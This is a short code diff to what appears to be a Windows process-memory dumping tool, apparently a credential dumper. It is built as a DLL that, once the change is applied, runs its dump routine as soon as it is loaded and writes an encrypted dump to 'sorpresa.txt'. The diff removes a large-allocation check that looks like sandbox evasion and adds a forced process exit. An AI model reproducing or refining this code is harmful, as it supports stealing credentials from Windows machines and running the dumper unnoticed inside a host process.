@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <TlHelp32.h>
 #include <DbgHelp.h>
+#pragma comment (lib, "Dbghelp.lib")
 
 // Global variables the will hold the dump data and its size
 LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Allocate 200MB buffer on the heap
@@ -198,18 +199,21 @@ int main(int argc, char** argv)
 	DWORD bytesWritten = 0;
 	WriteFile(hFile, dumpBuffer, dumpSize, &bytesWritten, NULL);
 	printf("[+] Enrypted dump data written to \"sorpresa.txt\" file\n");
+
+	ExitProcess(0);
 }
 
 extern "C" __declspec(dllexport)
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
-	char* mem = NULL;
-	mem = (char*)malloc(6442450944);
+	//char* mem = NULL;
+	//mem = (char*)malloc(6442450944);
 
-	if (mem != NULL) {
-		memset(mem, 00, 6442450944);
-		free(mem);
-		main(0, {});
-	}
+	//if (mem != NULL) {
+		//memset(mem, 00, 6442450944);
+		//free(mem);
+		//main(0, {});
+	//}
 
+	main(0, {});
 	return TRUE;
 }
